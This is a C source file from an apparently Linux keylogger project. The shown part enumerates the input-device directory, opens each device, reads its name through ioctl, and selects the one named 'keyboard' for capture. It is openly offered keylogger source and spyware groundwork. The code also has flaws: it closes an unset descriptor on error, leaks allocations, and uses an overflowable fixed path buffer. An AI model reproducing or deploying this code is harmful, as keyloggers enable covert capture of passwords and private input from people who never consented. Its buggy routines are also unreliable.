#include "keylogger.h"

#define GET_DEVICE_NAME(fd, buffer) ioctl(fd, EVIOCGNAME(MIN_BUFFER_SIZE), buffer)
#define KEYBOARD "keyboard"


Device* new_device()
{
	Device* device = NULL;
	MALLOC(device, sizeof(Device), Device*);
	MALLOC(device->path, sizeof(char*), char*);
	MALLOC(device->name, sizeof(char*), char*);
	return device;
}

void destroy_device(Device** device)
{
	if((*device)->path != NULL)
		FREE((*device)->path);

	if((*device)->name != NULL)
		FREE((*device)->name);
	
	FREE((*device));
}

static inline
bool _is_keyboard_str(const char* buffer, int buffer_len)
{
	char b[buffer_len]; int j = 0;

	for (int i = 0; i < buffer_len; i++)
	{
		if (buffer[i] != ' ' && buffer[i] != '\0')
		{
			b[j++] = buffer[i];
		}
		else
		{
			if(memcmp(b, KEYBOARD, strlen(KEYBOARD)) == 0)
			{
				return 1;
			}
			else
			{
				j = 0;
				memset(b, 0, buffer_len);
			}
		}
	}
	return 0;
}

bool is_keyboard_device(const Device** dev)
{
	if(_is_keyboard_str((*dev)->name, MIN_BUFFER_SIZE) == 1)
		return 1;
	return 0;
}

static inline
bool exists_device_path(const char* dev)
{
	if (access(dev, F_OK|R_OK) == 0)
		return 1;
	return 0;
}

Device* open_device(const char* dev)
{
	Device* device = new_device();
	char buffer[MIN_BUFFER_SIZE];
	int fd;

	if(exists_device_path(dev))
		fd = open (dev, O_RDONLY, 0);
	else
		fd = -1;

	if(fd != -1)
	{
		if(GET_DEVICE_NAME(fd, buffer) == -1)
		{
			close(device->fd);
			destroy_device(&device);
			return NULL;
		}

		device->fd = fd;
		device->path = safe_dup(dev);
		device->name = safe_dup(buffer);

		return device;
	}

	destroy_device(&device);
	return NULL;
}

bool find_keyboard_device(Device** dst_device)
{
	PRINT(INFO, "Looking keyboard device\n");
	DIR* devices_dir = opendir(ROOT_DEVICES);
	Device* device = NULL;
	struct dirent *dir = NULL;

	// how to list a dir, take it from 
	// http://stackoverflow.com/questions/4204666/how-to-list-files-in-a-directory-in-a-c-program
	if (devices_dir != NULL)
	{
		while ((dir = readdir(devices_dir)) != NULL)
	    {
	    	char devices[30] = ROOT_DEVICES;
	    	join_path(devices, dir->d_name);
	    	device = open_device(safe_dup(devices));

	    	if(device != NULL)
	    	{
		    	if(is_keyboard_device((const Device**)&device))
		    	{
		    		closedir(devices_dir);
		    		PRINT(INFO, "keyboard device has been found\n");
		    		PRINT(INFO, "Keyboard device name: %s\n", device->name);
		    		PRINT(INFO, "Keyboard device path: %s\n", device->path);
		    		(*dst_device) = device;
		    		return 1;
		    	}

		    	destroy_device(&device);
	    	}
	    }

	    closedir(devices_dir);
	}

	PRINT(ERROR, "Cannot find keyboard device, something wrong happends");
	return 0;
}
